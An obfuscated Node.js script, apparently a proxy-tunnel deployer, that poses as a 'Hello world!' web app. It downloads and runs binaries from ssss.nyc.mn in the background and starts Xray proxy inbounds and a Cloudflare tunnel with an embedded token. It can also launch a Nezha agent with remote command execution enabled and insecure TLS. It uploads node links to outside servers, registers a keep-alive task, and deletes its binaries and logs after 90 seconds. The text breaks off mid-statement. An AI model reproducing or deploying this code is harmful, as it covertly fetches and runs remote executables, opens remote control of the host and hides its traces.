function _0x51f1(){const _0x5a338c=['win32','child_process','UUID','119410ixzimN','ARGO_DOMAIN','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','match','CFPORT','8443','tunnel.json','https://arm64.ssss.nyc.mn/v1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2053','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','fileName','\x0a\x20\x20\x20\x20','\x0a\x20\x20tunnel:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','/trojan-argo','boot.log','base64','length','/api/add-subscriptions','https://arm64.ssss.nyc.mn/web','ARGO_AUTH','basename','http','unlink','894BHGcck','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','&path=%2Ftrojan-argo%3Fed%3D2560#','abcdefghijklmnopqrstuvwxyz','amd','random','join','127.0.0.1','readFileSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','10BCkEuK','pipe','error','Hello\x20world!','CFIP','--tls','Error\x20downloading\x20files:','tls','config.yaml','tunnel.yml','NEZHA_PORT','/vmess-argo','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','freedom','xtls-rprx-vision','saas.sin.fan','4689wcHBhe','axios','false','34895kufcPd','set','includes','3020124ujxnpC','./tmp','mkdirSync','map','Error\x20in\x20startserver:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','listen','App\x20is\x20running','https://arm64.ssss.nyc.mn/bot','stringify','\x20-c\x20','UPLOAD_URL','split','list.txt','firefox','2083','Download\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','FILE_PATH','trojan','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','Nodes\x20uploaded\x20successfully','Add\x20automatic\x20access\x20task\x20faild:\x20','filter','charAt','clear','del\x20/f\x20/q\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20>/dev/null\x202>&1','Error\x20executing\x20command:\x20','ARGO_PORT','/config.json\x20>/dev/null\x202>&1\x20&','readdirSync','blackhole','1086XJwXnv','253SzHLxY','rm\x20-rf\x20','push','NEZHA_KEY','eyJhIjoiMTczYTQ3YzQ2YTY5NWM1MTcwOWU5YTBlNDZhNTk4MzIiLCJ0IjoiMTNkOGU0MDgtZWY0Yy00ZTIwLWIwY2ItYmViZTJlNDgyMGZhIiwicyI6IlltWTBNV05tTURNdE9EWXlNQzAwTmpFMExUa3lNRGd0TVRZek5ESTFaV1ZqTlRRNSJ9','floor','Subscription\x20uploaded\x20successfully','from','arch','toString','pkill\x20-f\x20\x22[','get','/dev/null','chmod','application/json','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','sub','/vmess-argo?ed=2560','2096','existsSync','vmess','/vless-argo','direct','then','443','writeFileSync','automatic\x20access\x20task\x20added\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x20failed:\x20','taskkill\x20/f\x20/im\x20','e25fe7f7-a7b9-4003-9172-b36bdc4ee2b8','NAME','\x20is\x20running','post','\x20-s\x20','forEach','4yXsNiU','ArgoDomain:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','12156822fxNvPo','block','catch','?security=tls&sni=','\x20-p\x20','/api/delete-nodes','Empowerment\x20failed\x20for\x20','text/plain;\x20charset=utf-8','env','vless','https://amd64.ssss.nyc.mn/bot','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','createWriteStream','SERVER_PORT','substring','?encryption=none&security=tls&sni=','\x20>\x20nul\x202>&1','AUTO_ACCESS','aarch64','none','ARGO_DOMAIN:','quic','platform','message','data','true','Skipping\x20adding\x20automatic\x20access\x20task','PROJECT_URL','fileUrl','response','status','\x0aclient_secret:\x20','log','express','647866eTBrRL','.exe\x20>\x20nul\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&fp=firefox&type=ws&host=','2087','https://oooo.serv00.net/add-url','\x0a\x20\x20\x0avmess://','nohup\x20','statSync','arm64','test','unshift','unlinkSync','\x0a\x20\x20credentials-file:\x20','tcp','\x20is\x20created','exec','\x0avless://','util','arm','SUB_PATH','utf-8','hk.858.de5.net','TunnelSecret','11762648HXLhqP'];_0x51f1=function(){return _0x5a338c;};return _0x51f1();}const _0x471e6c=_0x12e1;(function(_0x30b9ea,_0x4d282d){const _0xc1184a=_0x12e1,_0x50a4b6=_0x30b9ea();while(!![]){try{const _0x443d81=-parseInt(_0xc1184a(0xa4))/0x1+parseInt(_0xc1184a(0x11d))/0x2*(-parseInt(_0xc1184a(0xf4))/0x3)+-parseInt(_0xc1184a(0x7f))/0x4*(-parseInt(_0xc1184a(0xc1))/0x5)+-parseInt(_0xc1184a(0xda))/0x6*(parseInt(_0xc1184a(0xf7))/0x7)+-parseInt(_0xc1184a(0xbd))/0x8+parseInt(_0xc1184a(0x82))/0x9*(-parseInt(_0xc1184a(0xe4))/0xa)+-parseInt(_0xc1184a(0x11e))/0xb*(-parseInt(_0xc1184a(0xfa))/0xc);if(_0x443d81===_0x4d282d)break;else _0x50a4b6['push'](_0x50a4b6['shift']());}catch(_0x4eaa7a){_0x50a4b6['push'](_0x50a4b6['shift']());}}}(_0x51f1,0xb7998));const express=require(_0x471e6c(0xa3)),app=express(),axios=require(_0x471e6c(0xf5)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x471e6c(0xb7)),exec=promisify(require(_0x471e6c(0xbf))[_0x471e6c(0xb5)]),{execSync}=require(_0x471e6c(0xbf)),UPLOAD_URL=process[_0x471e6c(0x8a)][_0x471e6c(0x105)]||'',PROJECT_URL=process[_0x471e6c(0x8a)][_0x471e6c(0x9d)]||'',AUTO_ACCESS=process[_0x471e6c(0x8a)][_0x471e6c(0x93)]||![],FILE_PATH=process[_0x471e6c(0x8a)][_0x471e6c(0x10c)]||_0x471e6c(0xfb),SUB_PATH=process[_0x471e6c(0x8a)][_0x471e6c(0xb9)]||_0x471e6c(0x12e),PORT=process[_0x471e6c(0x8a)][_0x471e6c(0x8f)]||process[_0x471e6c(0x8a)]['PORT']||0xbb8,UUID=process[_0x471e6c(0x8a)][_0x471e6c(0xc0)]||_0x471e6c(0x13d),NEZHA_SERVER=process[_0x471e6c(0x8a)][_0x471e6c(0x10f)]||'',NEZHA_PORT=process[_0x471e6c(0x8a)][_0x471e6c(0xee)]||'',NEZHA_KEY=process[_0x471e6c(0x8a)][_0x471e6c(0x121)]||'',ARGO_DOMAIN=process[_0x471e6c(0x8a)][_0x471e6c(0xc2)]||_0x471e6c(0xbb),ARGO_AUTH=process[_0x471e6c(0x8a)][_0x471e6c(0xd6)]||_0x471e6c(0x122),ARGO_PORT=process['env'][_0x471e6c(0x119)]||0x1f5c,CFIP=process[_0x471e6c(0x8a)][_0x471e6c(0xe8)]||_0x471e6c(0xf3),CFPORT=process[_0x471e6c(0x8a)][_0x471e6c(0xc5)]||0x1bb,NAME=process[_0x471e6c(0x8a)][_0x471e6c(0x7a)]||'';!fs[_0x471e6c(0x131)](FILE_PATH)?(fs[_0x471e6c(0xfc)](FILE_PATH),console[_0x471e6c(0xa2)](FILE_PATH+_0x471e6c(0xb4))):console[_0x471e6c(0xa2)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x35884e=_0x471e6c,_0x2c4d11=_0x35884e(0xdd);let _0x16b87d='';for(let _0x3660a7=0x0;_0x3660a7<0x6;_0x3660a7++){_0x16b87d+=_0x2c4d11[_0x35884e(0x113)](Math[_0x35884e(0x123)](Math[_0x35884e(0xdf)]()*_0x2c4d11[_0x35884e(0xd3)]));}return _0x16b87d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x471e6c(0xe0)](FILE_PATH,npmName),phpPath=path[_0x471e6c(0xe0)](FILE_PATH,phpName),webPath=path[_0x471e6c(0xe0)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x471e6c(0xe0)](FILE_PATH,_0x471e6c(0x107)),bootLogPath=path[_0x471e6c(0xe0)](FILE_PATH,_0x471e6c(0xd1)),configPath=path[_0x471e6c(0xe0)](FILE_PATH,'config.json');function deleteNodes(){const _0x54f8ab=_0x471e6c;try{if(!UPLOAD_URL)return;if(!fs[_0x54f8ab(0x131)](subPath))return;let _0x2cc3c9;try{_0x2cc3c9=fs['readFileSync'](subPath,_0x54f8ab(0xba));}catch{return null;}const _0x994c8=Buffer['from'](_0x2cc3c9,'base64')['toString'](_0x54f8ab(0xba)),_0x4ce50a=_0x994c8[_0x54f8ab(0x106)]('\x0a')[_0x54f8ab(0x112)](_0x2d8d0d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2d8d0d));if(_0x4ce50a[_0x54f8ab(0xd3)]===0x0)return;return axios['post'](UPLOAD_URL+_0x54f8ab(0x87),JSON[_0x54f8ab(0x103)]({'nodes':_0x4ce50a}),{'headers':{'Content-Type':'application/json'}})[_0x54f8ab(0x84)](_0x2aebb6=>{return null;}),null;}catch(_0x592990){return null;}}function cleanupOldFiles(){const _0x166cec=_0x471e6c;try{const _0x3272c4=fs[_0x166cec(0x11b)](FILE_PATH);_0x3272c4[_0x166cec(0x7e)](_0x2825ea=>{const _0x1988ac=_0x166cec,_0x4fcbb6=path[_0x1988ac(0xe0)](FILE_PATH,_0x2825ea);try{const _0x16fa2d=fs[_0x1988ac(0xad)](_0x4fcbb6);_0x16fa2d['isFile']()&&fs[_0x1988ac(0xb1)](_0x4fcbb6);}catch(_0x565e8a){}});}catch(_0xeb5209){}}app[_0x471e6c(0x129)]('/',function(_0x36588d,_0x42af91){const _0x481baf=_0x471e6c;_0x42af91['send'](_0x481baf(0xe7));});async function generateConfig(){const _0x3b369d=_0x471e6c,_0x439942={'log':{'access':_0x3b369d(0x12a),'error':_0x3b369d(0x12a),'loglevel':_0x3b369d(0x95)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3b369d(0x8b),'settings':{'clients':[{'id':UUID,'flow':_0x3b369d(0xf2)}],'decryption':_0x3b369d(0x95),'fallbacks':[{'dest':0xbb9},{'path':_0x3b369d(0x133),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x3b369d(0xd0),'dest':0xbbc}]},'streamSettings':{'network':_0x3b369d(0xb3)}},{'port':0xbb9,'listen':_0x3b369d(0xe1),'protocol':_0x3b369d(0x8b),'settings':{'clients':[{'id':UUID}],'decryption':_0x3b369d(0x95)},'streamSettings':{'network':_0x3b369d(0xb3),'security':_0x3b369d(0x95)}},{'port':0xbba,'listen':_0x3b369d(0xe1),'protocol':_0x3b369d(0x8b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3b369d(0x95)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3b369d(0x133)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b369d(0xd8),_0x3b369d(0xeb),_0x3b369d(0x97)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3b369d(0x132),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3b369d(0xef)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b369d(0xd8),'tls',_0x3b369d(0x97)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3b369d(0xe1),'protocol':_0x3b369d(0x10d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3b369d(0x95),'wsSettings':{'path':_0x3b369d(0xd0)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b369d(0xd8),_0x3b369d(0xeb),_0x3b369d(0x97)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x3b369d(0xf1),'tag':_0x3b369d(0x134)},{'protocol':_0x3b369d(0x11c),'tag':_0x3b369d(0x83)}]};fs['writeFileSync'](path[_0x3b369d(0xe0)](FILE_PATH,'config.json'),JSON[_0x3b369d(0x103)](_0x439942,null,0x2));}function getSystemArchitecture(){const _0x34af34=_0x471e6c,_0x459b01=os[_0x34af34(0x126)]();return _0x459b01===_0x34af34(0xb8)||_0x459b01===_0x34af34(0xae)||_0x459b01===_0x34af34(0x94)?_0x34af34(0xb8):_0x34af34(0xde);}function downloadFile(_0xec3865,_0x4a9235,_0x4e73d0){const _0x326ab9=_0x471e6c,_0xaa538f=_0xec3865;!fs[_0x326ab9(0x131)](FILE_PATH)&&fs[_0x326ab9(0xfc)](FILE_PATH,{'recursive':!![]});const _0x4514b4=fs[_0x326ab9(0x8e)](_0xaa538f);axios({'method':_0x326ab9(0x129),'url':_0x4a9235,'responseType':'stream'})[_0x326ab9(0x135)](_0x440a8c=>{const _0x1f2d51=_0x326ab9;_0x440a8c[_0x1f2d51(0x9a)][_0x1f2d51(0xe5)](_0x4514b4),_0x4514b4['on']('finish',()=>{const _0x37e1f8=_0x1f2d51;_0x4514b4['close'](),console['log']('Download\x20'+path[_0x37e1f8(0xd7)](_0xaa538f)+'\x20successfully'),_0x4e73d0(null,_0xaa538f);}),_0x4514b4['on'](_0x1f2d51(0xe6),_0x2c0ee4=>{const _0x1a6b41=_0x1f2d51;fs[_0x1a6b41(0xd9)](_0xaa538f,()=>{});const _0x30eddf=_0x1a6b41(0x10a)+path[_0x1a6b41(0xd7)](_0xaa538f)+_0x1a6b41(0x13b)+_0x2c0ee4[_0x1a6b41(0x99)];console['error'](_0x30eddf),_0x4e73d0(_0x30eddf);});})[_0x326ab9(0x84)](_0x1bbf47=>{const _0x3b062b=_0x326ab9,_0x338534='Download\x20'+path['basename'](_0xaa538f)+_0x3b062b(0x13b)+_0x1bbf47[_0x3b062b(0x99)];console[_0x3b062b(0xe6)](_0x338534),_0x4e73d0(_0x338534);});}async function downloadFilesAndRun(){const _0x5ce5dd=_0x471e6c,_0x5950d0=getSystemArchitecture(),_0x1b4a13=getFilesForArchitecture(_0x5950d0);if(_0x1b4a13[_0x5ce5dd(0xd3)]===0x0){console[_0x5ce5dd(0xa2)](_0x5ce5dd(0xc9));return;}const _0x236469=_0x1b4a13[_0x5ce5dd(0xfd)](_0x306eed=>{return new Promise((_0x2a7324,_0x37eb4a)=>{const _0x1e6473=_0x12e1;downloadFile(_0x306eed[_0x1e6473(0xcc)],_0x306eed[_0x1e6473(0x9e)],(_0x11798a,_0xdace75)=>{_0x11798a?_0x37eb4a(_0x11798a):_0x2a7324(_0xdace75);});});});try{await Promise['all'](_0x236469);}catch(_0x4adca9){console['error'](_0x5ce5dd(0xea),_0x4adca9);return;}function _0x24c19f(_0x1eac5b){const _0x664242=_0x5ce5dd,_0x1e28bb=0x1fd;_0x1eac5b[_0x664242(0x7e)](_0xe1a1a2=>{const _0x31ad48=_0x664242;fs['existsSync'](_0xe1a1a2)&&fs[_0x31ad48(0x12b)](_0xe1a1a2,_0x1e28bb,_0x30bc48=>{const _0x21146f=_0x31ad48;_0x30bc48?console['error'](_0x21146f(0x88)+_0xe1a1a2+':\x20'+_0x30bc48):console[_0x21146f(0xa2)]('Empowerment\x20success\x20for\x20'+_0xe1a1a2+':\x20'+_0x1e28bb[_0x21146f(0x127)](0x8));});});}const _0x21bc9c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24c19f(_0x21bc9c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x146d5e=NEZHA_SERVER[_0x5ce5dd(0xf9)](':')?NEZHA_SERVER[_0x5ce5dd(0x106)](':')['pop']():'',_0x525383=new Set(['443','8443',_0x5ce5dd(0x130),_0x5ce5dd(0xa9),_0x5ce5dd(0x109),_0x5ce5dd(0xca)]),_0x3161a0=_0x525383['has'](_0x146d5e)?_0x5ce5dd(0x9b):_0x5ce5dd(0xf6),_0x52c209=_0x5ce5dd(0xa1)+NEZHA_KEY+_0x5ce5dd(0xcb)+NEZHA_SERVER+_0x5ce5dd(0xf0)+_0x3161a0+_0x5ce5dd(0xa7)+UUID;fs[_0x5ce5dd(0x137)](path[_0x5ce5dd(0xe0)](FILE_PATH,_0x5ce5dd(0xec)),_0x52c209);const _0x361127='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x5ce5dd(0x10e);try{await exec(_0x361127),console[_0x5ce5dd(0xa2)](phpName+_0x5ce5dd(0x7b)),await new Promise(_0x56f319=>setTimeout(_0x56f319,0x3e8));}catch(_0x28b5cf){console[_0x5ce5dd(0xe6)]('php\x20running\x20error:\x20'+_0x28b5cf);}}else{let _0x20fce6='';const _0x49b6c6=[_0x5ce5dd(0x136),_0x5ce5dd(0xc6),_0x5ce5dd(0x130),_0x5ce5dd(0xa9),'2083',_0x5ce5dd(0xca)];_0x49b6c6[_0x5ce5dd(0xf9)](NEZHA_PORT)&&(_0x20fce6=_0x5ce5dd(0xe9));const _0x2e567f='nohup\x20'+npmPath+_0x5ce5dd(0x7d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5ce5dd(0x86)+NEZHA_KEY+'\x20'+_0x20fce6+_0x5ce5dd(0xe3);try{await exec(_0x2e567f),console['log'](npmName+_0x5ce5dd(0x7b)),await new Promise(_0xe77c15=>setTimeout(_0xe77c15,0x3e8));}catch(_0x42477d){console['error']('npm\x20running\x20error:\x20'+_0x42477d);}}}else console['log'](_0x5ce5dd(0xcf));const _0x5595de=_0x5ce5dd(0xac)+webPath+_0x5ce5dd(0x104)+FILE_PATH+_0x5ce5dd(0x11a);try{await exec(_0x5595de),console[_0x5ce5dd(0xa2)](webName+_0x5ce5dd(0x7b)),await new Promise(_0x3e1afd=>setTimeout(_0x3e1afd,0x3e8));}catch(_0x2ec7c1){console[_0x5ce5dd(0xe6)]('web\x20running\x20error:\x20'+_0x2ec7c1);}if(fs[_0x5ce5dd(0x131)](botPath)){let _0x432d14;if(ARGO_AUTH[_0x5ce5dd(0xc4)](/^[A-Z0-9a-z=]{120,250}$/))_0x432d14=_0x5ce5dd(0xc3)+ARGO_AUTH;else ARGO_AUTH[_0x5ce5dd(0xc4)](/TunnelSecret/)?_0x432d14=_0x5ce5dd(0x116)+FILE_PATH+'/tunnel.yml\x20run':_0x432d14=_0x5ce5dd(0x139)+FILE_PATH+_0x5ce5dd(0x10b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x432d14+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x5ce5dd(0x7b)),await new Promise(_0x54f6bb=>setTimeout(_0x54f6bb,0x7d0));}catch(_0x4e67e7){console[_0x5ce5dd(0xe6)](_0x5ce5dd(0x118)+_0x4e67e7);}}await new Promise(_0x311246=>setTimeout(_0x311246,0x1388));}function getFilesForArchitecture(_0x39c54f){const _0x1474dc=_0x471e6c;let _0x1d9d77;_0x39c54f===_0x1474dc(0xb8)?_0x1d9d77=[{'fileName':webPath,'fileUrl':_0x1474dc(0xd5)},{'fileName':botPath,'fileUrl':_0x1474dc(0x102)}]:_0x1d9d77=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1474dc(0x8c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x75b3fb=_0x39c54f===_0x1474dc(0xb8)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x1d9d77[_0x1474dc(0xb0)]({'fileName':npmPath,'fileUrl':_0x75b3fb});}else{const _0x3741a9=_0x39c54f===_0x1474dc(0xb8)?_0x1474dc(0xc8):'https://amd64.ssss.nyc.mn/v1';_0x1d9d77[_0x1474dc(0xb0)]({'fileName':phpPath,'fileUrl':_0x3741a9});}}return _0x1d9d77;}function argoType(){const _0x104d25=_0x471e6c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x104d25(0xa2)](_0x104d25(0xdb));return;}if(ARGO_AUTH[_0x104d25(0xf9)](_0x104d25(0xbc))){fs[_0x104d25(0x137)](path[_0x104d25(0xe0)](FILE_PATH,_0x104d25(0xc7)),ARGO_AUTH);const _0x5181d7=_0x104d25(0xce)+ARGO_AUTH[_0x104d25(0x106)]('\x22')[0xb]+_0x104d25(0xb2)+path[_0x104d25(0xe0)](FILE_PATH,'tunnel.json')+_0x104d25(0x81)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x104d25(0x137)](path['join'](FILE_PATH,_0x104d25(0xed)),_0x5181d7);}else console[_0x104d25(0xa2)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0xf8a989=_0x471e6c;let _0x51fdff;if(ARGO_AUTH&&ARGO_DOMAIN)_0x51fdff=ARGO_DOMAIN,console[_0xf8a989(0xa2)](_0xf8a989(0x96),_0x51fdff),await _0x557c33(_0x51fdff);else try{const _0xf053f8=fs[_0xf8a989(0xe2)](path[_0xf8a989(0xe0)](FILE_PATH,_0xf8a989(0xd1)),_0xf8a989(0xba)),_0xacde3d=_0xf053f8[_0xf8a989(0x106)]('\x0a'),_0x172b82=[];_0xacde3d[_0xf8a989(0x7e)](_0x5cf383=>{const _0x2c7962=_0xf8a989,_0x111470=_0x5cf383[_0x2c7962(0xc4)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x111470){const _0x128e7d=_0x111470[0x1];_0x172b82[_0x2c7962(0x120)](_0x128e7d);}});if(_0x172b82[_0xf8a989(0xd3)]>0x0)_0x51fdff=_0x172b82[0x0],console[_0xf8a989(0xa2)](_0xf8a989(0x80),_0x51fdff),await _0x557c33(_0x51fdff);else{console[_0xf8a989(0xa2)](_0xf8a989(0xff)),fs[_0xf8a989(0xb1)](path[_0xf8a989(0xe0)](FILE_PATH,_0xf8a989(0xd1)));async function _0x507fee(){const _0xd33a26=_0xf8a989;try{process[_0xd33a26(0x98)]===_0xd33a26(0xbe)?await exec(_0xd33a26(0x13c)+botName+_0xd33a26(0xa5)):await exec(_0xd33a26(0x128)+botName[_0xd33a26(0x113)](0x0)+']'+botName[_0xd33a26(0x90)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0xa846e1){}}_0x507fee(),await new Promise(_0x1621e9=>setTimeout(_0x1621e9,0xbb8));const _0x4a0fd6=_0xf8a989(0x139)+FILE_PATH+_0xf8a989(0x10b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4a0fd6+'\x20>/dev/null\x202>&1\x20&'),console[_0xf8a989(0xa2)](botName+_0xf8a989(0x7b)),await new Promise(_0x57a7bc=>setTimeout(_0x57a7bc,0xbb8)),await extractDomains();}catch(_0x1037d3){console[_0xf8a989(0xe6)](_0xf8a989(0x118)+_0x1037d3);}}}catch(_0x2c948e){console[_0xf8a989(0xe6)]('Error\x20reading\x20boot.log:',_0x2c948e);}async function _0x557c33(_0x45b8e6){const _0x3d5b67=_0xf8a989,_0x164bf6=execSync(_0x3d5b67(0x12d),{'encoding':_0x3d5b67(0xba)}),_0x2accd1=_0x164bf6['trim'](),_0x2315db=NAME?NAME+'-'+_0x2accd1:_0x2accd1;return new Promise(_0x5c79bd=>{setTimeout(()=>{const _0x5c2658=_0x12e1,_0x3c6a59={'v':'2','ps':''+_0x2315db,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5c2658(0x95),'net':'ws','type':_0x5c2658(0x95),'host':_0x45b8e6,'path':_0x5c2658(0x12f),'tls':_0x5c2658(0xeb),'sni':_0x45b8e6,'alpn':'','fp':_0x5c2658(0x108)},_0x2aa547=_0x5c2658(0xb6)+UUID+'@'+CFIP+':'+CFPORT+_0x5c2658(0x91)+_0x45b8e6+_0x5c2658(0xa8)+_0x45b8e6+_0x5c2658(0x13a)+_0x2315db+_0x5c2658(0xab)+Buffer[_0x5c2658(0x125)](JSON['stringify'](_0x3c6a59))[_0x5c2658(0x127)](_0x5c2658(0xd2))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5c2658(0x85)+_0x45b8e6+_0x5c2658(0xa8)+_0x45b8e6+_0x5c2658(0xdc)+_0x2315db+_0x5c2658(0xcd);console[_0x5c2658(0xa2)](Buffer[_0x5c2658(0x125)](_0x2aa547)[_0x5c2658(0x127)](_0x5c2658(0xd2))),fs[_0x5c2658(0x137)](subPath,Buffer['from'](_0x2aa547)[_0x5c2658(0x127)](_0x5c2658(0xd2))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5c2658(0x129)]('/'+SUB_PATH,(_0x49c9c8,_0x1a9895)=>{const _0xc3f9f6=_0x5c2658,_0x1784d1=Buffer[_0xc3f9f6(0x125)](_0x2aa547)[_0xc3f9f6(0x127)](_0xc3f9f6(0xd2));_0x1a9895[_0xc3f9f6(0xf8)]('Content-Type',_0xc3f9f6(0x89)),_0x1a9895['send'](_0x1784d1);}),_0x5c79bd(_0x2aa547);},0x7d0);});}}async function uploadNodes(){const _0x537270=_0x471e6c;if(UPLOAD_URL&&PROJECT_URL){const _0x4807f8=PROJECT_URL+'/'+SUB_PATH,_0x4804e3={'subscription':[_0x4807f8]};try{const _0x5c1b07=await axios[_0x537270(0x7c)](UPLOAD_URL+_0x537270(0xd4),_0x4804e3,{'headers':{'Content-Type':_0x537270(0x12c)}});return _0x5c1b07&&_0x5c1b07[_0x537270(0xa0)]===0xc8?(console[_0x537270(0xa2)](_0x537270(0x124)),_0x5c1b07):null;}catch(_0x195e96){if(_0x195e96[_0x537270(0x9f)]){if(_0x195e96['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x537270(0x131)](listPath))return;const _0x3f97aa=fs['readFileSync'](listPath,_0x537270(0xba)),_0xc4dd5=_0x3f97aa[_0x537270(0x106)]('\x0a')[_0x537270(0x112)](_0x51d2ca=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x537270(0xaf)](_0x51d2ca));if(_0xc4dd5[_0x537270(0xd3)]===0x0)return;const _0x529112=JSON[_0x537270(0x103)]({'nodes':_0xc4dd5});try{const _0x1aafe6=await axios[_0x537270(0x7c)](UPLOAD_URL+'/api/add-nodes',_0x529112,{'headers':{'Content-Type':_0x537270(0x12c)}});return _0x1aafe6&&_0x1aafe6[_0x537270(0xa0)]===0xc8?(console[_0x537270(0xa2)](_0x537270(0x110)),_0x1aafe6):null;}catch(_0x5c7ba5){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1e1dc1=_0x12e1,_0x4fa228=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4fa228[_0x1e1dc1(0x120)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4fa228['push'](phpPath);process[_0x1e1dc1(0x98)]===_0x1e1dc1(0xbe)?exec(_0x1e1dc1(0x115)+_0x4fa228[_0x1e1dc1(0xe0)]('\x20')+_0x1e1dc1(0x92),_0x42cbbe=>{const _0x149ebb=_0x1e1dc1;console[_0x149ebb(0x114)](),console[_0x149ebb(0xa2)](_0x149ebb(0x101)),console[_0x149ebb(0xa2)](_0x149ebb(0x8d));}):exec(_0x1e1dc1(0x11f)+_0x4fa228[_0x1e1dc1(0xe0)]('\x20')+_0x1e1dc1(0x117),_0x1e98c0=>{const _0x1cfaf4=_0x1e1dc1;console[_0x1cfaf4(0x114)](),console['log'](_0x1cfaf4(0x101)),console[_0x1cfaf4(0xa2)](_0x1cfaf4(0x8d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1515ca=_0x471e6c;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x1515ca(0x9c));return;}try{const _0x92e441=await axios[_0x1515ca(0x7c)](_0x1515ca(0xaa),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1515ca(0x12c)}});return console[_0x1515ca(0xa2)](_0x1515ca(0x138)),_0x92e441;}catch(_0x5e75aa){return console[_0x1515ca(0xe6)](_0x1515ca(0x111)+_0x5e75aa[_0x1515ca(0x99)]),null;}}async function startserver(){const _0xfb92db=_0x471e6c;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x44e9cb){console[_0xfb92db(0xe6)](_0xfb92db(0xfe),_0x44e9cb);}}function _0x12e1(_0x2f28c5,_0x39f293){_0x2f28c5=_0x2f28c5-0x7a;const _0x51f145=_0x51f1();let _0x12e1f3=_0x51f145[_0x2f28c5];return _0x12e1f3;}startserver()['catch'](_0x4aab53=>{const 